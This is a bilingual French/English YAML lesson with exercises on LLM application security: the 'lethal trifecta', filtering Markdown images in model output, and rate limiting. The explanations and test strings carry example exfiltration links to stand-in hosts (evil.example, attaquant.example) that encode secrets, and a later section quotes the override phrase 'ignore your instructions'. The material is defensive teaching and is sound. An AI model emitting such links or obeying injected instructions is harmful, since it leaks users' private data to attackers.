- id: c3
  type: idee
  fr: 'La **triade létale** : un agent qui a des **données privées**, lit du **contenu non fiable** et peut **communiquer vers l’extérieur** est détournable pour les voler. Règle : jamais les trois dans un même agent.'
  en: 'The **lethal trifecta**: an agent that has **private data**, reads **untrusted content** and can **communicate outward** can be hijacked to steal them. Rule: never all three in one agent.'
  exemple:
    fr: Un agent qui lit tes fichiers et le web, mais ne peut pas envoyer de requêtes arbitraires, n’a que deux sommets sur trois.
    en: An agent that reads your files and the web, but cannot send arbitrary requests, has only two of the three corners.
  figure:
    kind: schema
    lignes:
    - titre:
        fr: Les trois sommets
        en: The three corners
      noeuds:
      - fr: données privées
        en: private data
      - fr: contenu non fiable
        en: untrusted content
      - fr: canal de sortie
        en: outbound channel
      - fr: 'les trois : danger'
        en: 'all three: danger'
        ton: bad
    legende:
      fr: Retirer un sommet casse l’attaque.
      en: Removing one corner breaks the attack.
- id: c4
  type: code
  note:
    kind: exercise
    poids: 1
  fr: 'À toi. **Écris `triade_letale(capacites)`** : `capacites` est un ensemble de mots parmi `"donnees_privees"`, `"contenu_non_fiable"` et `"communication_externe"`. Renvoie `True` seulement si les **trois** y figurent.'
  en: 'Your turn. **Write `triade_letale(capacites)`**: `capacites` is a set of words among `"donnees_privees"`, `"contenu_non_fiable"` and `"communication_externe"`. Return `True` only if **all three** are in it.'
  depart: |
    # écris ta fonction triade_letale ici
  tests: |-
    assert triade_letale({"donnees_privees", "contenu_non_fiable", "communication_externe"}) is True
    assert triade_letale({"donnees_privees", "contenu_non_fiable"}) is False
    assert triade_letale({"contenu_non_fiable", "communication_externe"}) is False
    assert triade_letale(set()) is False
    assert triade_letale({"donnees_privees", "contenu_non_fiable", "communication_externe", "autre"}) is True
  solutionCode: |
    def triade_letale(capacites):
        donnees = "donnees_privees" in capacites
        non_fiable = "contenu_non_fiable" in capacites
        sortie = "communication_externe" in capacites
        return donnees and non_fiable and sortie
  indice:
    fr: Trois tests `in` combinés avec `and`.
    en: Three `in` tests combined with `and`.
  explication:
    fr: 'Ce contrôle peut se faire au démarrage de l’agent : s’il réunit les trois, on refuse de le lancer ou on exige une confirmation humaine à chaque envoi.'
    en: 'This check can be done at the agent’s startup: if it combines all three, we refuse to launch it or require human confirmation for each send.'
- id: c5
  type: idee
  fr: '**Gestion défaillante des sorties** : la réponse du modèle est une entrée non fiable. Un lien ou une image Markdown vers `https://attaquant.example/?d=SECRET` peut faire fuiter des données dès que l’interface charge l’image. On filtre les images et les liens vers des hôtes non autorisés.'
  en: '**Improper output handling**: the model’s response is an untrusted input. A Markdown link or image to `https://attaquant.example/?d=SECRET` can leak data as soon as the interface loads the image. We filter images and links to unauthorised hosts.'
  exemple:
    fr: '`![](https://evil.example/x?d=mdp)` s’affiche comme une image invisible, mais l’adresse, avec le secret, est interrogée.'
    en: '`![](https://evil.example/x?d=mdp)` displays as an invisible image, but the address, with the secret, is requested.'
- id: c6
  type: exemple
  titre:
    fr: Repérer les images d’une réponse
    en: Spotting a response’s images
  lang: python
  etapes:
  - code: |-
      import re
      texte = "Voici ![logo](https://exemple.org/a.png) et ![](https://evil.example/x?d=mdp)"
    fr: Une réponse avec deux images Markdown.
    en: A response with two Markdown images.
  - code: liens = re.findall(r"!\[[^\]]*\]\(([^)]+)\)", texte)
    fr: L’expression trouve l’adresse entre parenthèses de chaque image.
    en: The expression finds the address in parentheses of each image.
  - code: print(liens)
    fr: 'On affiche les deux adresses : la seconde est suspecte.'
    en: 'We display the two addresses: the second is suspicious.'
  verif: |-
    import re
    texte = "Voici ![logo](https://exemple.org/a.png) et ![](https://evil.example/x?d=mdp)"
    liens = re.findall(r"!\[[^\]]*\]\(([^)]+)\)", texte)
    print(liens)
  sortie: '[''https://exemple.org/a.png'', ''https://evil.example/x?d=mdp'']'
- id: c7
  type: code
  note:
    kind: exercise
    poids: 1
  fr: '**Écris `retirer_images(texte, hotes_autorises)`** : remplace chaque image Markdown `![alt](url)` dont l’hôte (`urllib.parse.urlparse(url).hostname`) n’est pas dans `hotes_autorises` par `"[image retirée]"`. Utilise `re.sub(r"!\[([^\]]*)\]\(([^)]+)\)", remplacer, texte)` avec une fonction `remplacer(m)`.'
  en: '**Write `retirer_images(texte, hotes_autorises)`**: replace each Markdown image `![alt](url)` whose host (`urllib.parse.urlparse(url).hostname`) is not in `hotes_autorises` with `"[image retirée]"`. Use `re.sub(r"!\[([^\]]*)\]\(([^)]+)\)", remplacer, texte)` with a function `remplacer(m)`.'
  depart: |
    import re
    import urllib.parse

    # écris ta fonction retirer_images ici
  tests: |-
    t = "A ![logo](https://exemple.org/a.png) B ![](https://evil.example/x?d=mdp) C"
    r = retirer_images(t, ["exemple.org"])
    assert r == "A ![logo](https://exemple.org/a.png) B [image retirée] C"
    assert retirer_images("rien", ["x"]) == "rien"
    assert retirer_images("![a](http://evil.example/p)", []) == "[image retirée]"
  solutionCode: |
    import re
    import urllib.parse

    def retirer_images(texte, hotes_autorises):
        def remplacer(m):
            hote = urllib.parse.urlparse(m.group(2)).hostname
            return m.group(0) if hote in hotes_autorises else "[image retirée]"
        return re.sub(r"!\[([^\]]*)\]\(([^)]+)\)", remplacer, texte)
  indice:
    fr: Dans `remplacer(m)`, `m.group(2)` est l’URL ; renvoie `m.group(0)` (l’image entière) si l’hôte est autorisé.
    en: In `remplacer(m)`, `m.group(2)` is the URL; return `m.group(0)` (the whole image) if the host is allowed.
  explication:
    fr: Le même principe protège les liens cliquables et les appels réseau déclenchés par la réponse.
    en: The same principle protects clickable links and network calls triggered by the response.
- id: c8
  type: idee
  fr: '**Consommation non bornée** : sans limites, un utilisateur ou une boucle d’agent épuise le budget. On met des **plafonds** : requêtes par minute, tokens par requête, étapes d’agent. Un limiteur à fenêtre glissante compte les requêtes récentes.'
  en: '**Unbounded consumption**: without limits, a user or an agent loop exhausts the budget. We set **caps**: requests per minute, tokens per request, agent steps. A sliding-window limiter counts recent requests.'
  exemple:
    fr: 'Limite de 5 requêtes par minute : la 6ᵉ requête dans la même minute est refusée.'
    en: 'Limit of 5 requests per minute: the 6th request in the same minute is refused.'
- id: c9
  type: code
  note:
    kind: exercise
    poids: 1
  fr: '**Écris `limiteur(horodatages, maintenant, fenetre, limite)`** : `horodatages` est la liste des instants des requêtes passées (en secondes). Compte celles qui ont eu lieu depuis moins de `fenetre` secondes (`maintenant - t < fenetre`) ; renvoie `True` (requête autorisée) si ce compte est **strictement inférieur** à `limite`.'
  en: '**Write `limiteur(horodatages, maintenant, fenetre, limite)`**: `horodatages` is the list of past request times (in seconds). Count those that happened less than `fenetre` seconds ago (`maintenant - t < fenetre`); return `True` (request allowed) if this count is **strictly less than** `limite`.'
  depart: |
    # écris ta fonction limiteur ici
  tests: |-
    assert limiteur([0, 10, 20], 30, 60, 5) is True
    assert limiteur([0, 10, 20, 30, 40], 50, 60, 5) is False
    assert limiteur([0, 10, 20, 30, 40], 100, 60, 5) is True
    assert limiteur([], 5, 60, 1) is True
    assert limiteur([95], 100, 60, 1) is False
  solutionCode: |
    def limiteur(horodatages, maintenant, fenetre, limite):
        recents = [t for t in horodatages if maintenant - t < fenetre]
        return len(recents) < limite
  indice:
    fr: Garde les `t` récents avec une compréhension de liste, puis compare leur nombre à `limite` avec `<`.
    en: Keep the recent `t` with a list comprehension, then compare their count to `limite` with `<`.
  explication:
    fr: Un limiteur protège aussi contre l’extraction de masse de données et contre les factures surprises.
    en: A limiter also protects against mass data extraction and surprise bills.
- id: c10
  type: saisie
  note:
    kind: exercise
    poids: 1
  fr: Un service autorise 5 requêtes par minute. Un attaquant en envoie 1 000 en une heure, à vitesse maximale. Combien sont acceptées au plus ?
  en: A service allows 5 requests per minute. An attacker sends 1,000 in an hour, at maximum speed. At most how many are accepted?
  reponses:
  - '300'
  verif: print(5 * 60)
  indice:
    fr: Il y a 60 minutes dans l’heure, avec 5 requêtes autorisées dans chacune.
    en: There are 60 minutes in the hour, with 5 requests allowed in each.
  explication:
    fr: '$5\times60=300$ au plus : 700 demandes sont refusées.'
    en: '$5\times60=300$ at most: 700 requests are refused.'
- id: c11
  type: idee
  fr: 'Les autres risques se traitent par des pratiques du cursus. **Chaîne d’approvisionnement** : vérifier modèles et paquets (13.5). **Désinformation** : citer et s’abstenir (14.5). **Fuite du prompt système** : n’y mettre aucun secret.'
  en: 'The other risks are handled by practices from the curriculum. **Supply chain**: verify models and packages (13.5). **Misinformation**: cite and abstain (14.5). **System prompt leakage**: put no secret in it.'
  exemple:
    fr: 'Un prompt système n’est pas un coffre-fort : un utilisateur habile peut souvent le faire réciter.'
    en: 'A system prompt is not a safe: a clever user can often make it recite.'
- id: c12
  type: piege
  fr: Un détecteur de mots-clés (« ignore tes instructions ») donne un faux sentiment de sécurité. Les attaques se reformulent à l’infini, dans toutes les langues, avec des encodages. Les filtres ne remplacent pas les limites structurelles (permissions, triade, plafonds) ; ils peuvent seulement s’y ajouter.
  en: A keyword detector (“ignore your instructions”) gives a false sense of security. Attacks can be reworded endlessly, in all languages, with encodings. Filters do not replace structural limits (permissions, trifecta, caps); they can only add to them.
- id: c13
  type: code
  defi: true
  note:
    kind: quiz
    poids: 1
  fr: 'Défi. **Écris `evaluer_agent(capacites, hotes_autorises, texte)`** qui renvoie un dictionnaire `{"triade": ..., "sortie": ...}` : `"triade"` vaut `triade_letale(capacites)`, `"sortie"` vaut `retirer_images(texte, hotes_autorises)`. `triade_letale` et `retirer_images` sont fournies.'
  en: 'Challenge. **Write `evaluer_agent(capacites, hotes_autorises, texte)`** returning a dictionary `{"triade": ..., "sortie": ...}`: `"triade"` is `triade_letale(capacites)`, `"sortie"` is `retirer_images(texte, hotes_autorises)`. `triade_letale` and `retirer_images` are provided.'
  depart: |
    import re
    import urllib.parse

    def triade_letale(capacites):
        donnees = "donnees_privees" in capacites
        non_fiable = "contenu_non_fiable" in capacites
        sortie = "communication_externe" in capacites
        return donnees and non_fiable and sortie

    import re
    import urllib.parse

    def retirer_images(texte, hotes_autorises):
        def remplacer(m):
            hote = urllib.parse.urlparse(m.group(2)).hostname
            return m.group(0) if hote in hotes_autorises else "[image retirée]"
        return re.sub(r"!\[([^\]]*)\]\(([^)]+)\)", remplacer, texte)

    # écris ta fonction evaluer_agent ici
  tests: |-
    r = evaluer_agent({"donnees_privees", "contenu_non_fiable", "communication_externe"}, ["exemple.org"], "![](https://evil.example/x)")
    assert r == {"triade": True, "sortie": "[image retirée]"}
    r = evaluer_agent({"donnees_privees"}, ["exemple.org"], "bonjour")
    assert r == {"triade": False, "sortie": "bonjour"}
  solutionCode: |
    import re
    import urllib.parse

    def retirer_images(texte, hotes_autorises):
        def remplacer(m):
            hote = urllib.parse.urlparse(m.group(2)).hostname
            return m.group(0) if hote in hotes_autorises else "[image retirée]"
        return re.sub(r"!\[([^\]]*)\]\(([^)]+)\)", remplacer, texte)

    def triade_letale(capacites):
        donnees = "donnees_privees" in capacites
        non_fiable = "contenu_non_fiable" in capacites
        sortie = "communication_externe" in capacites
        return donnees and non_fiable and sortie

    def evaluer_agent(capacites, hotes_autorises, texte):
        return {"triade": triade_letale(capacites), "sortie": retirer_images(texte, hotes_autorises)}
  indice:
    fr: 'Deux appels combinés dans un dictionnaire : une ligne de `return` suffit.'
    en: 'Two calls combined in a dictionary: a single `return` line is enough.'
  explication:
    fr: 'Tu combines deux défenses de natures différentes : une règle de conception (triade) et un filtre de sortie.'
    en: 'You combine two defences of different natures: a design rule (trifecta) and an output filter.'
- id: c14
  type: retenir
  fr: 'Top 10 OWASP LLM : injection de prompt, fuite, chaîne d’approvisionnement, empoisonnement, sorties, agence excessive, prompt système, vecteurs, désinformation, consommation. Triade létale : pas les trois à la fois. Filtrer les sorties, plafonner les ressources.'
  en: 'OWASP LLM Top 10: prompt injection, disclosure, supply chain, poisoning, outputs, excessive agency, system prompt, vectors, misinformation, consumption. Lethal trifecta: never all three at once. Filter outputs, cap resources.'
